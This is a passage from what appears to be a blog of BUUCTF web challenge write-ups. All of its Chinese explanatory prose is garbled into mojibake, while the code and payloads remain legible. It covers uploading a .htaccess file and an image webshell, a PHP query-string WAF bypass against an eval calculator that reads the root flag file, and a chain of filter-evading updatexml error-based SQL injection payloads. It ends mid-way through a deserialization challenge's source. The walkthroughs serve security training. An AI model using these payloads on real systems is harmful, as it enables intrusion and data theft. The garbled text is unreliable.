alt="image-20220710111959632"></p><p>æ‰“å¼€å…ˆçœ‹åˆ°ä¸€ä¸ªå°¸ä½“åœ¨åœ¨ç¬‘ï¼Œæˆ‘ä»¬å…ˆè¯•è¯•èƒ½ä¸èƒ½ç›´æ¥ä¸Šä¼ phpæ–‡ä»¶</p><p><img src="/2022/06/21/buuctf-wp/image-20220710112344441.png" alt="image-20220710112344441"></p><p>çœ‹æ¥ä¸è¡Œï¼Œé‚£åœ¨è¯•è¯•èƒ½ä¸èƒ½æŠ“åŒ…ä¿®æ”¹å‰ç«¯æ–‡ä»¶åç¼€åï¼Œçœ‹çœ‹æ˜¯ä¸æ˜¯å‰ç«¯éªŒè¯ï¼ŒæŠŠphpæ”¹æˆpngï¼Œåœ¨æŠ“åŒ…ä¿®æ”¹åç¼€ä¸ºphp</p><p><img src="/2022/06/21/buuctf-wp/image-20220710112344441.png" alt="image-20220710112344441"></p><p>è¿˜æ˜¯ä¸€æ ·ï¼Œè¿˜æœ‰ä¸€ä¸ªçŒœæƒ³å°±æ˜¯MIMEéªŒè¯ï¼Œå¯¹content-typeè¿›è¡Œäº†æ£€æŸ¥ï¼Œå¯ä»¥è¯•è¯•ä½¿ç”¨bp<a href="https://so.csdn.net/so/search?q=%E6%8A%93%E5%8C%85&spm=1001.2101.3001.7020">æŠ“åŒ…</a>ï¼Œä¿®æ”¹ä¸Šä¼ çš„PHPçš„content-typeä¸ºimage&#x2F;pngï¼Œä½†æ˜¯è¿˜æ˜¯ä¸€æ ·çš„</p><p><img src="/2022/06/21/buuctf-wp/image-20220710112344441.png" alt="image-20220710112344441"></p><p>äºæ˜¯ï¼Œå¯ä»¥ç”¨.htaccesså®ç°å›¾ç‰‡é©¬ä»¥phpæ–‡ä»¶å½¢å¼è¯»å–ï¼ˆå¦‚æœä¸äº†è§£å¯ä»¥æŠŠ.htaccessæ–‡ä»¶äº†è§£ä¸€ä¸‹ï¼ŒæŠŠçº¿ä¸‹é¶åœºupload-labsåšä¸€ä¸‹ï¼‰</p><p>ä½†æ˜¯ä¸Šä¼ æ—¶ï¼Œåˆè¢«è¿‡æ»¤äº†</p><p><img src="/2022/06/21/buuctf-wp/image-20220710112344441.png" alt="image-20220710112344441"></p><p>å°è¯•ä¿®æ”¹æ–‡ä»¶åä¸º.htaccess.pngï¼Œç„¶åç”¨bpæŠ“åŒ…ä¿®æ”¹å›.htaccessï¼Œä¸Šä¼ æˆåŠŸ</p><p><img src="/2022/06/21/buuctf-wp/image-20220710114410888.png" alt="image-20220710114410888"></p><p><img src="/2022/06/21/buuctf-wp/image-20220710114422488.png" alt="image-20220710114422488"></p><p>ç„¶åä¸Šä¼ å›¾ç‰‡æœ¨é©¬</p><p><img src="/2022/06/21/buuctf-wp/image-20220710114444539.png" alt="image-20220710114444539"></p><p>æŠŠè·¯å¾„å¤åˆ¶ä¸€ä¸‹</p><p><code>http://424ad9a4-20e6-4394-8150-06fc204ba3e0.node4.buuoj.cn:81/upload/9d0fb395a11b49196f664cfa8fe0200a/1.png</code></p><p><img src="/2022/06/21/buuctf-wp/image-20220710114617412.png" alt="image-20220710114617412"></p><p>èšå‰‘è¿æ¥æˆåŠŸ</p><p><img src="/2022/06/21/buuctf-wp/image-20220710114647722.png" alt="image-20220710114647722"></p><p>åœ¨æ ¹ç›®å½•å‘ç°flag</p><p>å¾—åˆ°flag</p><h2 id="4-RoarCTF-2019-Easy-Calc"><a href="#4-RoarCTF-2019-Easy-Calc" class="headerlink" title="4.[RoarCTF 2019]Easy Calc"></a>4.[RoarCTF 2019]Easy Calc</h2><h3 id="1-é¢˜ç›®æè¿°-2"><a href="#1-é¢˜ç›®æè¿°-2" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p><h3 id="2-wp-2"><a href="#2-wp-2" class="headerlink" title="2)wp"></a>2)wp</h3><p>è¿˜æ˜¯å¾—çœ‹å¤§ä½¬å¾—wpæ‰ä¼š</p><p><a href="https://blog.csdn.net/weixin_44077544/article/details/102630714">åŸæ–‡é“¾æ¥</a></p><p>è¿™æ˜¯calc.phpçš„å†…å®¹ï¼ŒæŸ¥çœ‹æºç å°±å¯ä»¥çœ‹åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>wafä¸»è¦å°±æ˜¯çœ‹æœ‰æ²¡æœ‰éæ•°å­—å­˜åœ¨ï¼Œç»•è¿‡wafå°±å¥½æ“ä½œäº†</p><hr><p>1.1PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§</p><p>è¿™æ˜¯åˆ«äººå¯¹PHPå­—ç¬¦ä¸²è§£ææ¼æ´çš„ç†è§£ï¼Œ<br>æˆ‘ä»¬çŸ¥é“PHPå°†æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆåœ¨URLæˆ–æ­£æ–‡ä¸­ï¼‰è½¬æ¢ä¸ºå†…éƒ¨$_GETæˆ–çš„å…³è”æ•°ç»„$_POSTã€‚</p><p>ä¾‹å¦‚ï¼š&#x2F;?foo&#x3D;barå˜æˆArray([foo] &#x3D;&gt; â€œbarâ€)ã€‚</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒæŸ¥è¯¢å­—ç¬¦ä¸²åœ¨è§£æçš„è¿‡ç¨‹ä¸­ä¼šå°†æŸäº›å­—ç¬¦åˆ é™¤æˆ–ç”¨ä¸‹åˆ’çº¿ä»£æ›¿ã€‚</p><p>ä¾‹å¦‚ï¼Œ&#x2F;?%20news[id%00&#x3D;42ä¼šè½¬æ¢ä¸ºArray([news_id] &#x3D;&gt; 42)ã€‚</p><p>å¦‚æœä¸€ä¸ªIDS&#x2F;IPSæˆ–WAFä¸­æœ‰ä¸€æ¡è§„åˆ™æ˜¯å½“news_idå‚æ•°çš„å€¼æ˜¯ä¸€ä¸ªéæ•°å­—çš„å€¼åˆ™æ‹¦æˆªï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨ä»¥ä¸‹è¯­å¥ç»•è¿‡ï¼š</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">new</span><span class="type">s</span>.php?%<span class="number">20</span><span class="keyword">new</span><span class="type">s</span>[id%<span class="number">00</span>=<span class="number">42</span><span class="string">&quot;+AND+1=0â€“</span></span><br></pre></td></tr></table></figure><p>ä¸Šè¿°PHPè¯­å¥çš„å‚æ•°%20news[id%00çš„å€¼å°†å­˜å‚¨åˆ°$_GET[â€œnews_idâ€]ä¸­ã€‚</p><p><u><strong>PHPéœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢ä¸ºæœ‰æ•ˆçš„å˜é‡åï¼Œå› æ­¤åœ¨è§£ææŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šåšä¸¤ä»¶äº‹ï¼š</strong></u></p><pre><code>1.åˆ é™¤ç©ºç™½ç¬¦2.å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰</code></pre><p>æˆ‘çš„ç†è§£ï¼š<br>å‡å¦‚wafä¸å…è®¸numå˜é‡ä¼ é€’å­—æ¯ï¼š</p><pre><code>http://www.xxx.com/index.php?num = aaaa   //æ˜¾ç¤ºéæ³•è¾“å…¥çš„è¯</code></pre><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åœ¨numå‰åŠ ä¸ªç©ºæ ¼ï¼š</p><pre><code>http://www.xxx.com/index.php? num = aaaa</code></pre><p>è¿™æ ·wafå°±æ‰¾ä¸åˆ°numè¿™ä¸ªå˜é‡äº†ï¼Œå› ä¸ºç°åœ¨çš„å˜é‡å«â€œï¼ˆç©ºæ ¼ï¼‰numâ€ï¼Œè€Œä¸æ˜¯â€œnumâ€ã€‚</p><p>ä½†phpåœ¨è§£æçš„æ—¶å€™ï¼Œä¼š<u>å…ˆæŠŠç©ºæ ¼ç»™å»æ‰</u>ï¼Œè¿™æ ·æˆ‘ä»¬çš„ä»£ç è¿˜èƒ½æ­£å¸¸è¿è¡Œï¼Œè¿˜ä¸Šä¼ äº†éæ³•å­—ç¬¦ã€‚</p><hr><p>var_dump() </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åˆ—ä¸¾æ•°ç»„å†…å®¹</span><br></pre></td></tr></table></figure><p>scandir() çš„ä½¿ç”¨ï¼š</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">scandir(<span class="built_in">directory</span>,sorting_order,<span class="built_in">context</span>);</span><br><span class="line"></span><br><span class="line"> è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„,å°±æ˜¯æ˜¾ç¤ºæ–‡ä»¶å¤¹åå­—</span><br></pre></td></tr></table></figure><p>file_get_contents() çš„ä½¿ç”¨ï¼š</p><pre><code>åŸå‹ï¼šfile_get_contents(path,include_path,context,start,max_length)file_get_contents() å‡½æ•°æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚å’Œ file() ä¸€æ ·ï¼Œä¸åŒçš„æ˜¯ file_get_contents() æŠŠæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚file_get_contents() å‡½æ•°æ˜¯ç”¨äºå°†æ–‡ä»¶çš„å†…å®¹è¯»å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„é¦–é€‰æ–¹æ³•ã€‚å¦‚æœæ“ä½œç³»ç»Ÿæ”¯æŒï¼Œè¿˜ä¼šä½¿ç”¨å†…å­˜æ˜ å°„æŠ€æœ¯æ¥å¢å¼ºæ€§èƒ½ã€‚å°±æ˜¯æ˜¾ç¤ºæ–‡ä»¶å†…å®¹</code></pre><hr><p>chr(47)æ˜¯<code>/</code>çš„ASCIIç¼–ç ï¼›ã€<code>/</code>å°±æ˜¯æ ¹ç›®å½•ï¼Œå¯ä»¥å…ˆè®¿é—®ä¸€ä¸‹æ ¹ç›®å½•ï¼Œæ‰¾æ‰¾å¤§æ¦‚flagåœ¨å“ªé‡Œã€‘</p><p>chr(102)æ˜¯<code>f</code>çš„ASCIIç¼–ç ï¼›</p><p>chr(49)æ˜¯<code>1</code>çš„ASCIIç¼–ç ï¼›</p><p>chr(97)æ˜¯<code>a</code>çš„ASCIIç¼–ç ï¼›</p><p>chr(103)æ˜¯<code>g</code>çš„ASCIIç¼–ç ã€‚</p><p>ã€å­—ç¬¦é—´ç”¨<code>.</code>è¿æ¥ï¼Œå¦‚<code>flag</code>-&gt;<code>chr(102).chr(49).chr(97).chr(103)</code>ã€‘</p><p>æ ¹æ®phpè§£æå­—ç¬¦ä¸²çš„ç‰¹æ€§</p><p>å…ˆè¯•è¯•è¿”å›çœ‹çœ‹æ ¹ç›®å½•ï¼ˆ&#x2F;ï¼‰ä¸‹çš„æ–‡ä»¶æœ‰å“ªäº›</p><p><code>http://node4.buuoj.cn:29105/calc.php?  num=var_dump(scandir(chr(47)))</code></p><p><img src="/2022/06/21/buuctf-wp/image-20220819232248275.png" alt="image-20220819232248275"></p><p>çœ‹åˆ°æœ‰ä¸ª<code>flagg</code></p><p>è¿”å›çœ‹çœ‹<code>/flagg</code>é‡Œçš„å†…å®¹</p><p><code>http://node4.buuoj.cn:29105/calc.php?  num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p><p><img src="/2022/06/21/buuctf-wp/image-20220819234552921.png" alt="image-20220819234552921"></p><h2 id="5-æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL"><a href="#5-æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL" class="headerlink" title="5.[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL"></a>5.[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h2><h3 id="1-é¢˜ç›®æè¿°-3"><a href="#1-é¢˜ç›®æè¿°-3" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p><h3 id="2-wp-3"><a href="#2-wp-3" class="headerlink" title="2)wp"></a>2)wp</h3><p>çœ‹åå­—ï¼ŒçŒœæµ‹è¿™ä¸ªsqlæ³¨å…¥è¿‡æ»¤å¾ˆä¸¥</p><p><img src="/2022/06/21/buuctf-wp/image-20220821144626428.png" alt="image-20220821144626428"></p><p>å…ˆè¯•è¯•fuzzæµ‹è¯•ï¼Œçœ‹çœ‹è¿‡æ»¤äº†å“ªäº›ï¼Œå‘ç°unionè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨è”åˆæ³¨å…¥</p><p><img src="/2022/06/21/buuctf-wp/image-20220821144002573.png" alt="image-20220821144002573"></p><p>ä½†æ˜¯å‘ç°updatexmlæ²¡æœ‰è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥å¯ä»¥è¯•è¯•æŠ¥é”™æ³¨å…¥</p><p><img src="/2022/06/21/buuctf-wp/image-20220821145036408.png" alt="image-20220821145036408"></p><p>å…ˆæ„é€ payload</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?username=<span class="number">1</span><span class="meta">&amp;password=1&#x27;or updatexml(1,concat(0x7e,database(),0x7e),1)%23</span></span><br><span class="line">ã€è¿™é‡Œ+è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¿™é‡Œç”¨<span class="meta">#ã€‘</span></span><br></pre></td></tr></table></figure><p>ç»“æœå‘ç°ç»“æœåˆè¢«è¿‡æ»¤äº†ï¼Œåé¢ç”¨fuzzåˆæµ‹è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°ç©ºæ ¼ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œç”¨%0aå’Œå…¶ä»–ç¬¦å·ä¹Ÿä¸èƒ½æ›¿æ¢ï¼Œæ‰€ä»¥åªèƒ½è¯•è¯•()æŠŠç»“æœæ¡†èµ·æ¥è¯•è¯•èƒ½ä¸èƒ½ç»•è¿‡</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=<span class="number">1</span>&amp;password=<span class="number">1</span>&#x27;or(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="comment">%23</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°æ•°æ®åº“å</p><p><img src="/2022/06/21/buuctf-wp/image-20220821172827984.png" alt="image-20220821172827984"></p><p>åé¢å°±æ˜¯å·®ä¸å¤šäº†ï¼Œä½†æ˜¯è¦æ³¨æ„ä¸èƒ½ç”¨ç©ºæ ¼ï¼Œè¦ç”¨()æ¡†ä½å¯¹è±¡</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema)<span class="keyword">like</span>(<span class="string">&#x27;geek&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br><span class="line">ã€è¿™é‡Œçš„=ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ç”¨<span class="keyword">like</span>æ›¿æ¢ã€‘</span><br></pre></td></tr></table></figure><p>å¾—åˆ°è¡¨å</p><p><img src="/2022/06/21/buuctf-wp/image-20220821173920231.png" alt="image-20220821173920231"></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(group_concat(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name)<span class="keyword">like</span>(<span class="string">&#x27;H4rDsq1&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°åˆ—å</p><p><img src="/2022/06/21/buuctf-wp/image-20220821174239954.png" alt="image-20220821174239954"></p><p>ç„¶åçœ‹çœ‹åˆ—é‡Œæ•°æ®æ‰¾æ‰¾flag</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=<span class="number">1</span>&amp;password=<span class="number">1</span>&#x27;<span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(group<span class="constructor">_concat(<span class="params">id</span>,<span class="params">username</span>,<span class="params">password</span>)</span>)from(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure><p>çœ‹å›æ˜¾çŸ¥é“flagåœ¨passwordé‡Œï¼Œä½†ä¸ºä»€ä¹ˆæ˜¾ç¤ºä¸å…¨ï¼Œ<strong>æ˜¯å› ä¸ºupdatexmlæŠ¥é”™å›æ˜¾çš„æ•°æ®é™åˆ¶æœ€å¤š32ä½ï¼Œæ‰€ä»¥æ— æ³•æ˜¾ç¤ºå…¨flag</strong></p><p><img src="/2022/06/21/buuctf-wp/image-20220821174509553.png" alt="image-20220821174509553"></p><p>æ‰€ä»¥å¯ä»¥ç”¨leftå’Œrightå‡½æ•°è¿›è¡Œåˆ†æ®µæ˜¾ç¤ºï¼Œæœ¬æ¥æƒ³ç”¨stustrå‡½æ•°ï¼Œä½†æ˜¯å‘ç°ä¹Ÿè¢«è¿‡æ»¤äº†</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">left</span>(<span class="keyword">password</span>,<span class="number">30</span>))<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆè¿™é‡Œleftå‡½æ•°æ˜¾ç¤º30ä¸ªå­—ç¬¦ï¼Œå› ä¸º0x7eä¹Ÿå°±æ˜¯<del>ä¹Ÿæ˜¯å­—ç¬¦ï¼Œ</del>å·²ç»å äº†ä¸¤ä½ï¼Œæ‰€ä»¥è¿˜å¯ä»¥æ˜¾ç¤º30ä½</p><p><img src="/2022/06/21/buuctf-wp/image-20220821220007687.png" alt="image-20220821220007687"></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">right</span>(<span class="keyword">password</span>,<span class="number">30</span>))<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/buuctf-wp/image-20220821220041922.png" alt="image-20220821220041922"></p><p>å› ä¸ºæ˜¯å·¦å³æ˜¾ç¤º30ä½ï¼Œæ‰€ä»¥flagå†…å®¹æœ‰é‡å ï¼Œæ•´ç†ä¸€ä¸‹</p><p>å¾—åˆ°flag</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">034eb054</span>-<span class="number">83b5</span>-412c-b90e-afc72c6ce998&#125;</span><br></pre></td></tr></table></figure><h2 id="6-ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz1"><a href="#6-ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz1" class="headerlink" title="6.[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz1"></a>6.[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz1</h2><p>1)é¢˜ç›®æè¿°</p><p>æ— </p><p>2)wp</p><p>ä¸€é“å…¸å‹çš„åºåˆ—åŒ–é¢˜ç›®</p><p>å…ˆå¯¹ä»£ç è¿›è¡Œåˆ†æ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span 